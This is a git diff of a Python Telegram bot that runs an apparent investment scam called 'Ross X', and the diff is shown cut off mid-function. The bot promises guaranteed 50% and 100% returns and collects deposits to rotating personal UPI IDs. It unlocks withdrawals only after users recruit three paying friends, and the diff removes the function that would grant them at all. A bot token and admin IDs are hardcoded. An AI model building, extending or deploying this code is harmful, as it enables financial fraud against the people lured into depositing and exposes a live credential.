@@ -15,11 +15,11 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Bot Configuration - UPDATED WITH YOUR DETAILS
+# Bot Configuration
 BOT_TOKEN = "8231456687:AAHuLM9GJckxIKcpQ8aEhjQDTN14e96_7-I"
-ADMIN_IDS = [7972815378, 8002906283]  # @chiefrossx and @angentrossx
+ADMIN_IDS = [7972815378, 8002906283]
 
-# UPI IDs List - UPDATED
+# UPI IDs List
 UPI_IDS = [
     "rossx1@kiwi",
     "rossx2@kiwi", 
@@ -29,7 +29,7 @@ UPI_IDS = [
 ]
 
 DATABASE_FILE = "rossxi.db"
-BOT_USERNAME = "your_bot_username"  # Replace with your actual bot username
+BOT_USERNAME = "your_bot_username"
 
 # User States
 USER_STATES = {}
@@ -40,51 +40,48 @@ class States:
     AWAITING_SCREENSHOT = "awaiting_screenshot"
     AWAITING_INVESTMENT_AMOUNT = "awaiting_investment_amount"
     AWAITING_CUSTOM_AMOUNT = "awaiting_custom_amount"
-    AWAITING_UPI_ID = "awaiting_upi_id"
-    AWAITING_PHONE = "awaiting_phone"
-    AWAITING_NAME = "awaiting_name"
 
-# Investment Plans - UPDATED AMOUNTS
+# Investment Plans
 PLANS = {
     '45_days': {
         'name': '45 Days Big Opportunity', 
-        'rate': 0.50,  # 50% returns!
+        'rate': 0.50,
         'duration': 45, 
-        'min': 199,    # UPDATED TO 199
+        'min': 199,
         'max': 5000,
-        'emoji': '🔥',
-        'description': 'Fast Track to Wealth!'
+        'emoji': '🔥'
     },
     '90_days': {
         'name': '90 Days Big Opportunity', 
-        'rate': 1.00,  # 100% returns!
+        'rate': 1.00,
         'duration': 90, 
-        'min': 299,    # UPDATED TO 299
+        'min': 299,
         'max': 10000,
-        'emoji': '💎',
-        'description': 'Double Your Money!'
+        'emoji': '💎'
     }
 }
-
-# Animation frames
-LOADING_FRAMES = ["⏳", "⌛", "⏳", "⌛"]
-MONEY_ANIMATION = ["💰", "💸", "💵", "💴", "💶", "💷", "💰"]
-ROCKET_ANIMATION = ["🚀", "🌟", "✨", "💫", "⭐", "🚀"]
 
 # ================== UTILITY FUNCTIONS ==================
 
 def get_random_upi():
-    """Get random UPI ID from the list"""
     return random.choice(UPI_IDS)
+
+def set_user_state(user_id, state, data=None):
+    USER_STATES[user_id] = {'state': state, 'data': data or {}}
+
+def get_user_state(user_id):
+    return USER_STATES.get(user_id, {'state': States.NONE, 'data': {}})
+
+def clear_user_state(user_id):
+    if user_id in USER_STATES:
+        del USER_STATES[user_id]
 
 # ================== DATABASE FUNCTIONS ==================
 
 def init_database():
-    """Initialize SQLite database with referral system"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     
-    # Users table with referral tracking
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             telegram_id INTEGER PRIMARY KEY,
@@ -97,12 +94,10 @@ def init_database():
             total_referrals INTEGER DEFAULT 0,
             available_withdrawals INTEGER DEFAULT 0,
             is_active BOOLEAN DEFAULT TRUE,
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            FOREIGN KEY (referred_by) REFERENCES users(telegram_id)
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
     
-    # Referral tracking table
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS referrals (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -110,26 +105,10 @@ def init_database():
             referred_id INTEGER,
             has_invested BOOLEAN DEFAULT FALSE,
             investment_amount REAL DEFAULT 0,
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            FOREIGN KEY (referrer_id) REFERENCES users(telegram_id),
-            FOREIGN KEY (referred_id) REFERENCES users(telegram_id)
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
     
-    # Plans table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS plans (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            name TEXT,
-            duration_days INTEGER,
-            interest_rate REAL,
-            min_amount REAL,
-            max_amount REAL,
-            is_active BOOLEAN DEFAULT TRUE
-        )
-    ''')
-    
-    # Investments table
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS investments (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -140,12 +119,10 @@ def init_database():
             start_date DATE,
             maturity_date DATE,
             status TEXT DEFAULT 'active',
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            FOREIGN KEY (user_id) REFERENCES users(telegram_id)
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
     
-    # Deposits table
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS deposits (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -158,25 +135,7 @@ def init_database():
             status TEXT DEFAULT 'pending',
             admin_notes TEXT,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            approved_at TIMESTAMP,
-            FOREIGN KEY (user_id) REFERENCES users(telegram_id)
-        )
-    ''')
-    
-    # Withdrawals table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS withdrawals (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER,
-            investment_id INTEGER,
-            amount REAL,
-            withdrawal_type TEXT,
-            user_upi_id TEXT,
-            status TEXT DEFAULT 'pending',
-            requested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            completed_at TIMESTAMP,
-            FOREIGN KEY (user_id) REFERENCES users(telegram_id),
-            FOREIGN KEY (investment_id) REFERENCES investments(id)
+            approved_at TIMESTAMP
         )
     ''')
     
@@ -184,11 +143,9 @@ def init_database():
     conn.close()
 
 def generate_referral_code(user_id):
-    """Generate unique referral code"""
     return f"RX{str(user_id)[-6:]}{random.randint(10,99)}"
 
 def get_user_data(user_id):
-    """Get user data from database"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     cursor.execute('SELECT * FROM users WHERE telegram_id = ?', (user_id,))
@@ -212,7 +169,6 @@ def get_user_data(user_id):
     return None
 
 def create_user(user_id, username, name=None, phone=None, referred_by=None):
-    """Create new user with referral tracking"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     
@@ -223,14 +179,12 @@ def create_user(user_id, username, name=None, phone=None, referred_by=None):
         VALUES (?, ?, ?, ?, ?, ?)
     ''', (user_id, username, name, phone, referral_code, referred_by))
     
-    # If referred by someone, add to referrals table
     if referred_by:
         cursor.execute('''
             INSERT INTO referrals (referrer_id, referred_id)
             VALUES (?, ?)
         ''', (referred_by, user_id))
         
-        # Update referrer's total referrals count
         cursor.execute('''
             UPDATE users SET total_referrals = total_referrals + 1
             WHERE telegram_id = ?
@@ -240,98 +194,18 @@ def create_user(user_id, username, name=None, phone=None, referred_by=None):
     conn.close()
 
 def update_wallet_balance(user_id, amount, operation='add'):
-    """Update user wallet balance"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     
     if operation == 'add':
         cursor.execute('UPDATE users SET wallet_balance = wallet_balance + ? WHERE telegram_id = ?', (amount, user_id))
-    else:  # subtract
+    else:
         cursor.execute('UPDATE users SET wallet_balance = wallet_balance - ? WHERE telegram_id = ?', (amount, user_id))
     
     conn.commit()
     conn.close()
 
-def mark_referral_invested(referrer_id, referred_id, amount):
-    """Mark that a referred user has invested"""
-    conn = sqlite3.connect(DATABASE_FILE)
-    cursor = conn.cursor()
-    
-    cursor.execute('''
-        UPDATE referrals 
-        SET has_invested = TRUE, investment_amount = investment_amount + ?
-        WHERE referrer_id = ? AND referred_id = ?
-    ''', (amount, referrer_id, referred_id))
-    
-    # Check if referrer now has 3 investing referrals
-    cursor.execute('''
-        SELECT COUNT(*) FROM referrals 
-        WHERE referrer_id = ? AND has_invested = TRUE
-    ''', (referrer_id,))
-    
-    investing_referrals = cursor.fetchone()[0]
-    
-    if investing_referrals >= 3:
-        # Grant withdrawal permission
-        cursor.execute('''
-            UPDATE users SET available_withdrawals = available_withdrawals + 1
-            WHERE telegram_id = ?
-        ''', (referrer_id,))
-        
-        # Reset referral count for next cycle
-        if investing_referrals == 3:
-            cursor.execute('''
-                UPDATE users SET total_referrals = 0
-                WHERE telegram_id = ?
-            ''', (referrer_id,))
-    
-    conn.commit()
-    conn.close()
-    
-    return investing_referrals
-
-def can_user_withdraw(user_id):
-    """Check if user can withdraw"""
-    conn = sqlite3.connect(DATABASE_FILE)
-    cursor = conn.cursor()
-    cursor.execute('SELECT available_withdrawals FROM users WHERE telegram_id = ?', (user_id,))
-    result = cursor.fetchone()
-    conn.close()
-    
-    return result[0] > 0 if result else False
-
-def use_withdrawal_permission(user_id):
-    """Use one withdrawal permission"""
-    conn = sqlite3.connect(DATABASE_FILE)
-    cursor = conn.cursor()
-    cursor.execute('''
-        UPDATE users SET available_withdrawals = available_withdrawals - 1
-        WHERE telegram_id = ?
-    ''', (user_id,))
-    conn.commit()
-    conn.close()
-
-def get_referral_stats(user_id):
-    """Get referral statistics"""
-    conn = sqlite3.connect(DATABASE_FILE)
-    cursor = conn.cursor()
-    
-    cursor.execute('''
-        SELECT COUNT(*) as total,
-               COUNT(CASE WHEN has_invested = TRUE THEN 1 END) as invested
-        FROM referrals WHERE referrer_id = ?
-    ''', (user_id,))
-    
-    result = cursor.fetchone()
-    conn.close()
-    
-    return {
-        'total_referrals': result[0] if result else 0,
-        'investing_referrals': result[1] if result else 0
-    }
-
 def save_deposit_request(data):
-    """Save deposit request"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     cursor.execute('''
@@ -345,7 +219,6 @@ def save_deposit_request(data):
     return deposit_id
 
 def create_investment(user_id, plan_id, amount):
-    """Create new investment and handle referral rewards"""
     plan = PLANS[plan_id]
     expected_returns = amount * plan['rate']
     start_date = datetime.now().date()
@@ -359,22 +232,11 @@ def create_investment(user_id, plan_id, amount):
     ''', (user_id, plan_id, amount, expected_returns, start_date, maturity_date))
     
     investment_id = cursor.lastrowid
-    
-    # Check if user was referred
-    cursor.execute('SELECT referred_by FROM users WHERE telegram_id = ?', (user_id,))
-    result = cursor.fetchone()
-    
-    if result and result[0]:
-        referrer_id = result[0]
-        # Mark this referral as invested
-        investing_count = mark_referral_invested(referrer_id, user_id, amount)
-    
     conn.commit()
     conn.close()
     return investment_id
 
 def get_user_investments(user_id):
-    """Get user's investments"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     cursor.execute('''
@@ -400,7 +262,6 @@ def get_user_investments(user_id):
     return investments
 
 def get_pending_deposits():
-    """Get pending deposit requests for admin"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     cursor.execute('''
@@ -431,24 +292,20 @@ def get_pending_deposits():
     return deposits
 
 def approve_deposit(deposit_id, admin_notes=''):
-    """Approve deposit request"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     
-    # Get deposit details
     cursor.execute('SELECT user_id, amount FROM deposits WHERE id = ?', (deposit_id,))
     result = cursor.fetchone()
     
     if result:
         user_id, amount = result
         
-        # Update deposit status
         cursor.execute('''
             UPDATE deposits SET status = 'approved', admin_notes = ?, approved_at = CURRENT_TIMESTAMP
             WHERE id = ?
         ''', (admin_notes, deposit_id))
         
-        # Add to wallet
         cursor.execute('UPDATE users SET wallet_balance = wallet_balance + ? WHERE telegram_id = ?', (amount, user_id))
         
         conn.commit()
@@ -458,22 +315,35 @@ def approve_deposit(deposit_id, admin_notes=''):
     conn.close()
     return None, None
 
-# ================== STATE MANAGEMENT ==================
+def can_user_withdraw(user_id):
+    conn = sqlite3.connect(DATABASE_FILE)
+    cursor = conn.cursor()
+    cursor.execute('SELECT available_withdrawals FROM users WHERE telegram_id = ?', (user_id,))
+    result = cursor.fetchone()
+    conn.close()
+    return result[0] > 0 if result else False
 
-def set_user_state(user_id, state, data=None):
-    USER_STATES[user_id] = {'state': state, 'data': data or {}}
-
-def get_user_state(user_id):
-    return USER_STATES.get(user_id, {'state': States.NONE, 'data': {}})
-
-def clear_user_state(user_id):
-    if user_id in USER_STATES:
-        del USER_STATES[user_id]
+def get_referral_stats(user_id):
+    conn = sqlite3.connect(DATABASE_FILE)
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        SELECT COUNT(*) as total,
+               COUNT(CASE WHEN has_invested = TRUE THEN 1 END) as invested
+        FROM referrals WHERE referrer_id = ?
+    ''', (user_id,))
+    
+    result = cursor.fetchone()
+    conn.close()
+    
+    return {
+        'total_referrals': result[0] if result else 0,
+        'investing_referrals': result[1] if result else 0
+    }
 
 # ================== ANIMATION FUNCTIONS ==================
 
 async def send_animated_message(chat_id, context, frames, final_text, final_keyboard=None):
-    """Send animated message with loading effect"""
     message = await context.bot.send_message(chat_id, frames[0])
     
     for frame in frames[1:]:
@@ -497,7 +367,6 @@ async def send_animated_message(chat_id, context, frames, final_text, final_keyb
     )
 
 def create_progress_bar(percentage, length=10):
-    """Create animated progress bar"""
     filled = int(percentage / 100 * length)
     bar = "🟢" * filled + "⚪" * (length - filled)
     return f"{bar} {percentage:.1f}%"
@@ -505,7 +374,6 @@ def create_progress_bar(percentage, length=10):
 # ================== BOT HANDLERS ==================
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command handler with attractive welcome"""
     user = update.effective_user
     
     # Check for referral
@@ -529,7 +397,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         create_user(user.id, user.username, user.first_name, referred_by=referred_by)
         user_data = get_user_data(user.id)
         
-        # Send referral notification if applicable
         if referred_by:
             try:
                 await context.bot.send_message(
@@ -542,7 +409,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except:
                 pass
     
-    # Animated welcome sequence
     welcome_frames = [
         "🌟",
         "🌟✨",
@@ -596,7 +462,6 @@ _{user.first_name}, Your Journey to Wealth Starts HERE!_
     )
 
 async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Enhanced animated dashboard"""
     user_id = update.effective_user.id
     user_data = get_user_data(user_id)
     
@@ -611,7 +476,6 @@ async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     referral_stats = get_referral_stats(user_id)
     
-    # Loading animation
     loading_frames = [
         "⏳ Loading your dashboard...",
         "⌛ Calculating profits...",
@@ -680,7 +544,6 @@ _{user_data['name'] or 'Wealth Builder'}_
     )
 
 async def investment_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Enhanced investment plans with animations"""
     frames = [
         "🔥 Loading BIG opportunities...",
         "💎 Preparing MASSIVE returns...",
@@ -734,8 +597,139 @@ async def investment_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
         InlineKeyboardMarkup(keyboard)
     )
 
+async def add_money_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    frames = [
+        "💰 Preparing payment gateway...",
+        "🏦 Connecting to secure servers...",
+        "✅ Ready for deposit!"
+    ]
+    
+    selected_upi = get_random_upi()
+    
+    text = f"""
+💰 *ADD MONEY TO WALLET* 💰
+
+🔥 *STEP 1:* Pay to UPI ID
+`{selected_upi}`
+
+🔥 *STEP 2:* Submit payment proof
+
+⚡ *QUICK AMOUNTS:*
+💸 Start your wealth journey now!
+"""
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("₹199 🔥", callback_data=f'deposit_199_{selected_upi}'),
+            InlineKeyboardButton("₹299 💰", callback_data=f'deposit_299_{selected_upi}'),
+            InlineKeyboardButton("₹500 💎", callback_data=f'deposit_500_{selected_upi}')
+        ],
+        [
+            InlineKeyboardButton("₹1000 🚀", callback_data=f'deposit_1000_{selected_upi}'),
+            InlineKeyboardButton("₹2000 👑", callback_data=f'deposit_2000_{selected_upi}')
+        ],
+        [InlineKeyboardButton("💬 Custom Amount", callback_data=f'deposit_custom_{selected_upi}')],
+        [InlineKeyboardButton("📋 Copy UPI ID", callback_data=f'copy_upi_{selected_upi}')],
+        [InlineKeyboardButton("← Back to Wallet", callback_data='wallet')]
+    ]
+    
+    await send_animated_message(
+        update.callback_query.message.chat.id,
+        context,
+        frames,
+        text,
+        InlineKeyboardMarkup(keyboard)
+    )
+
+async def wallet_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_data = get_user_data(user_id)
+    
+    frames = [
+        "💰 Opening your wallet...",
+        "💸 Counting your money...",
+        "✨ Wallet ready!"
+    ]
+    
+    text = f"""
+💰 *YOUR WEALTH CENTER* 💰
+
+💎 *CURRENT BALANCE:*
+₹{user_data['wallet_balance']:,.2f}
+
+🚀 *WHAT YOU CAN DO:*
+• Add money instantly
+• View transaction history  
+• Invest in big opportunities
+• Track your wealth growth
+
+💡 *WEALTH TIPS:*
+Start with ₹199 or ₹299 and watch it grow!
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("💰 ADD MONEY NOW!", callback_data='add_money')],
+        [InlineKeyboardButton("📊 Transaction History", callback_data='transactions')],
+        [InlineKeyboardButton("🔥 INVEST NOW", callback_data='plans')],
+        [InlineKeyboardButton("← Back to Dashboard", callback_data='dashboard')]
+    ]
+    
+    await send_animated_message(
+        update.callback_query.message.chat.id,
+        context,
+        frames,
+        text,
+        InlineKeyboardMarkup(keyboard)
+    )
+
+async def how_it_works(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = """
+🎯 *HOW ROSS X WORKS* 🎯
+
+🔥 *STEP 1: JOIN & INVEST*
+• Register with Ross X
+• Add money to wallet
+• Choose investment plan
+• Earn guaranteed returns!
+
+💎 *STEP 2: REFER & UNLOCK*
+• Share your referral link
+• Get 3 friends to invest
+• Unlock withdrawal permissions
+• Access unlimited withdrawals!
+
+🚀 *STEP 3: WITHDRAW & REPEAT*
+• Withdraw your profits
+• Cycle resets after withdrawal
+• Refer 3 more for next withdrawal
+• Build unlimited wealth!
+
+⚡ *RETURNS:*
+• 45 Days: 50% profit (₹199 → ₹298)
+• 90 Days: 100% profit (₹299 → ₹598)
+
+🎊 *SPECIAL FEATURES:*
+• Instant deposits
+• Secure investments
+• Referral bonuses
+• 24/7 support
+
+*START YOUR WEALTH JOURNEY NOW!*
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("🔥 START INVESTING", callback_data='plans')],
+        [InlineKeyboardButton("👥 REFER FRIENDS", callback_data='referral')],
+        [InlineKeyboardButton("← Back to Menu", callback_data='dashboard')]
+    ]
+    
+    await update.callback_query.edit_message_text(
+        text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
 async def referral_system(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Enhanced referral system"""
     user_id = update.effective_user.id
     user_data = get_user_data(user_id)
     referral_stats = get_referral_stats(user_id)
@@ -792,7 +786,6 @@ async def referral_system(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def withdraw_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Enhanced withdrawal menu with referral check"""
     user_id = update.effective_user.id
     user_data = get_user_data(user_id)
     referral_stats = get_referral_stats(user_id)
@@ -859,210 +852,126 @@ Amount: ₹{inv['maturity_amount']:,.2f}
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
-async def add_money_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Enhanced add money with multiple UPI IDs"""
-    frames = [
-        "💰 Preparing payment gateway...",
-        "🏦 Connecting to secure servers...",
-        "✅ Ready for deposit!"
-    ]
-    
-    # Get random UPI ID for this transaction
-    selected_upi = get_random_upi()
-    
-    text = f"""
-💰 *ADD MONEY TO WALLET* 💰
+# ================== TEXT MESSAGE HANDLERS ==================
 
-🔥 *STEP 1:* Pay to UPI ID
-`{selected_upi}`
-
-🔥 *STEP 2:* Submit payment proof
-
-⚡ *QUICK AMOUNTS:*
-💸 Start your wealth journey now!
-"""
-    
-    keyboard = [
-        [
-            InlineKeyboardButton("₹199 🔥", callback_data=f'deposit_199_{selected_upi}'),
-            InlineKeyboardButton("₹299 💰", callback_data=f'deposit_299_{selected_upi}'),
-            InlineKeyboardButton("₹500 💎", callback_data=f'deposit_500_{selected_upi}')
-        ],
-        [
-            InlineKeyboardButton("₹1000 🚀", callback_data=f'deposit_1000_{selected_upi}'),
-            InlineKeyboardButton("₹2000 👑", callback_data=f'deposit_2000_{selected_upi}')
-        ],
-        [InlineKeyboardButton("💬 Custom Amount", callback_data=f'deposit_custom_{selected_upi}')],
-        [InlineKeyboardButton("📋 Copy UPI ID", callback_data=f'copy_upi_{selected_upi}')],
-        [InlineKeyboardButton("← Back to Wallet", callback_data='wallet')]
-    ]
-    
-    await send_animated_message(
-        update.callback_query.message.chat.id,
-        context,
-        frames,
-        text,
-        InlineKeyboardMarkup(keyboard)
-    )
-
-async def wallet_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Enhanced wallet menu"""
+async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle all text messages based on user state"""
     user_id = update.effective_user.id
-    user_data = get_user_data(user_id)
+    text = update.message.text.strip()
+    user_state_data = get_user_state(user_id)
+    current_state = user_state_data['state']
     
-    frames = [
-        "💰 Opening your wallet...",
-        "💸 Counting your money...",
-        "✨ Wallet ready!"
-    ]
-    
-    text = f"""
-💰 *YOUR WEALTH CENTER* 💰
+    if current_state == States.AWAITING_DEPOSIT_DETAILS:
+        await handle_deposit_details_input(update, context, text)
+    elif current_state == States.AWAITING_CUSTOM_AMOUNT:
+        await handle_custom_amount_input(update, context, text)
+    elif current_state == States.AWAITING_INVESTMENT_AMOUNT:
+        await handle_investment_amount_input(update, context, text)
+    else:
+        await handle_unknown_message(update, context)
 
-💎 *CURRENT BALANCE:*
-₹{user_data['wallet_balance']:,.2f}
-
-🚀 *WHAT YOU CAN DO:*
-• Add money instantly
-• View transaction history  
-• Invest in big opportunities
-• Track your wealth growth
-
-💡 *WEALTH TIPS:*
-Start with ₹199 or ₹299 and watch it grow!
-"""
-    
-    keyboard = [
-        [InlineKeyboardButton("💰 ADD MONEY NOW!", callback_data='add_money')],
-        [InlineKeyboardButton("📊 Transaction History", callback_data='transactions')],
-        [InlineKeyboardButton("🔥 INVEST NOW", callback_data='plans')],
-        [InlineKeyboardButton("← Back to Dashboard", callback_data='dashboard')]
-    ]
-    
-    await send_animated_message(
-        update.callback_query.message.chat.id,
-        context,
-        frames,
-        text,
-        InlineKeyboardMarkup(keyboard)
-    )
-
-async def how_it_works(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """How it works explanation"""
-    text = """
-🎯 *HOW ROSS X WORKS* 🎯
-
-🔥 *STEP 1: JOIN & INVEST*
-• Register with Ross X
-• Add money to wallet
-• Choose investment plan
-• Earn guaranteed returns!
-
-💎 *STEP 2: REFER & UNLOCK*
-• Share your referral link
-• Get 3 friends to invest
-• Unlock withdrawal permissions
-• Access unlimited withdrawals!
-
-🚀 *STEP 3: WITHDRAW & REPEAT*
-• Withdraw your profits
-• Cycle resets after withdrawal
-• Refer 3 more for next withdrawal
-• Build unlimited wealth!
-
-⚡ *RETURNS:*
-• 45 Days: 50% profit (₹199 → ₹298)
-• 90 Days: 100% profit (₹299 → ₹598)
-
-🎊 *SPECIAL FEATURES:*
-• Instant deposits
-• Secure investments
-• Referral bonuses
-• 24/7 support
-
-*START YOUR WEALTH JOURNEY NOW!*
-"""
-    
-    keyboard = [
-        [InlineKeyboardButton("🔥 START INVESTING", callback_data='plans')],
-        [InlineKeyboardButton("👥 REFER FRIENDS", callback_data='referral')],
-        [InlineKeyboardButton("← Back to Menu", callback_data='dashboard')]
-    ]
-    
-    await update.callback_query.edit_message_text(
-        text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
-
-async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle all callback queries"""
-    query = update.callback_query
-    data = query.data
+async def handle_deposit_details_input(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
     user_id = update.effective_user.id
+    state_data = get_user_state(user_id)['data']
     
-    await query.answer()
-    
-    if data == 'dashboard':
-        await dashboard(update, context)
-    elif data == 'plans':
-        await investment_plans(update, context)
-    elif data == 'wallet':
-        await wallet_menu(update, context)
-    elif data == 'referral':
-        await referral_system(update, context)
-    elif data == 'add_money':
-        await add_money_flow(update, context)
-    elif data == 'how_it_works':
-        await how_it_works(update, context)
-    elif data == 'withdraw_menu':
-        await withdraw_menu(update, context)
-    elif data.startswith('deposit_'):
-        parts = data.split('_')
-        if len(parts) >= 3 and parts[1] == 'custom':
-            upi_id = parts[2]
-            await handle_custom_deposit(update, context, upi_id)
-        elif len(parts) >= 3:
-            amount = int(parts[1])
-            upi_id = parts[2]
-            await handle_deposit_amount(update, context, amount, upi_id)
-    elif data.startswith('copy_upi_'):
-        upi_id = data.replace('copy_upi_', '')
-        await query.answer(f"UPI ID copied: {upi_id}", show_alert=True)
-    elif data == 'copy_referral':
-        user_data = get_user_data(user_id)
-        await query.answer(f"Referral code copied: {user_data['referral_code']}", show_alert=True)
-    elif data.startswith('invest_'):
-        plan = data.replace('invest_', '')
-        await handle_investment_plan_selection(update, context, plan)
-    elif data.startswith('approve_deposit_'):
-        deposit_id = int(data.split('_')[2])
-        await approve_deposit_request(update, context, deposit_id)
-    elif data.startswith('reject_deposit_'):
-        deposit_id = int(data.split('_')[2])
-        await reject_deposit_request(update, context, deposit_id)
-    elif data == 'admin_panel':
-        await admin_panel(update, context)
-    elif data == 'pending_deposits':
-        await show_pending_deposits(update, context)
+    try:
+        lines = text.strip().split('\n')
+        upi_line = ""
+        utr_line = ""
+        
+        for line in lines:
+            line = line.strip()
+            if line.lower().startswith('upi:'):
+                upi_line = line.split(':', 1)[1].strip()
+            elif line.lower().startswith('utr:'):
+                utr_line = line.split(':', 1)[1].strip()
+        
+        if not upi_line or not utr_line:
+            await update.message.reply_text(
+                "❌ *Invalid format!*\n\n"
+                "Please send in this exact format:\n\n"
+                "```\n"
+                "UPI: yourname@paytm\n"
+                "UTR: 123456789012\n"
+                "```",
+                parse_mode='Markdown'
+            )
+            return
+        
+        if len(utr_line) < 8:
+            await update.message.reply_text("❌ UTR should be at least 8 characters long.")
+            return
+        
+        deposit_data = {
+            'amount': state_data['amount'],
+            'user_upi': upi_line,
+            'utr': utr_line,
+            'user_id': user_id,
+            'admin_upi': state_data['admin_upi']
+        }
+        
+        set_user_state(user_id, States.AWAITING_SCREENSHOT, deposit_data)
+        
+        frames = [
+            "✅ Details received!",
+            "🔍 Validating information...",
+            "📸 Ready for screenshot!"
+        ]
+        
+        final_text = f"""
+✅ *PAYMENT DETAILS RECEIVED!*
 
-async def handle_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE, amount, upi_id):
-    """Handle deposit amount selection with animation"""
+💰 Amount: ₹{deposit_data['amount']:,}
+🎯 Your UPI: {upi_line}
+🔢 UTR: {utr_line}
+🏦 Paid to: {deposit_data['admin_upi']}
+
+📸 *NOW SEND PAYMENT SCREENSHOT*
+⚡ Final step to complete deposit!
+"""
+        
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("❌ Cancel", callback_data='wallet')]
+        ])
+        
+        await send_animated_message(
+            update.message.chat.id,
+            context,
+            frames,
+            final_text,
+            keyboard
+        )
+        
+    except Exception as e:
+        await update.message.reply_text("❌ Error processing details. Please try again!")
+
+async def handle_custom_amount_input(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
+    user_id = update.effective_user.id
+    state_data = get_user_state(user_id)['data']
+    
+    try:
+        amount = float(text.replace('₹', '').replace(',', '').strip())
+        
+        if amount < 50 or amount > 50000:
+            await update.message.reply_text("❌ Amount should be between ₹50 - ₹50,000")
+            return
+            
+        await handle_deposit_amount_direct(update, context, amount, state_data['admin_upi'])
+        
+    except ValueError:
+        await update.message.reply_text("❌ Please enter a valid amount.\nExample: 1500")
+
+async def handle_deposit_amount_direct(update: Update, context: ContextTypes.DEFAULT_TYPE, amount, upi_id):
     user_id = update.effective_user.id
     set_user_state(user_id, States.AWAITING_DEPOSIT_DETAILS, {'amount': amount, 'admin_upi': upi_id})
-    
-    frames = [
-        f"💰 Processing ₹{amount} deposit...",
-        "🏦 Preparing payment instructions...",
-        "✅ Ready for payment!"
-    ]
     
     text = f"""
 💰 *PAYMENT INSTRUCTIONS* 💰
 
-🎯 Amount: *₹{amount}*
-🏦 UPI ID: `{upi_id}`
+Amount: ₹{amount}
+UPI ID: `{upi_id}`
 
+After payment, send details in this format: 
 Then send payment screenshot.
 """
     
@@ -1074,8 +983,107 @@ Then send payment screenshot.
         ])
     )
 
+async def handle_investment_amount_input(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
+    user_id = update.effective_user.id
+    state_data = get_user_state(user_id)['data']
+    
+    try:
+        amount = float(text.replace('₹', '').replace(',', '').strip())
+        plan = state_data['plan']
+        plan_info = PLANS[plan]
+        
+        if amount != plan_info['min']:
+            await update.message.reply_text(
+                f"❌ For this plan, investment amount is fixed at ₹{plan_info['min']}"
+            )
+            return
+        
+        user_data = get_user_data(user_id)
+        if user_data['wallet_balance'] < amount:
+            await update.message.reply_text(
+                f"❌ *Insufficient Balance!*\n\n"
+                f"💰 Your balance: ₹{user_data['wallet_balance']:,}\n"
+                f"💸 Required: ₹{amount:,}\n\n"
+                f"Add money to start earning!",
+                parse_mode='Markdown',
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("💰 ADD MONEY", callback_data='add_money')]
+                ])
+            )
+            return
+        
+        frames = [
+            "🔥 Creating your investment...",
+            "💰 Calculating returns...",
+            "📈 Setting up profit tracking...",
+            "✅ Investment activated!"
+        ]
+        
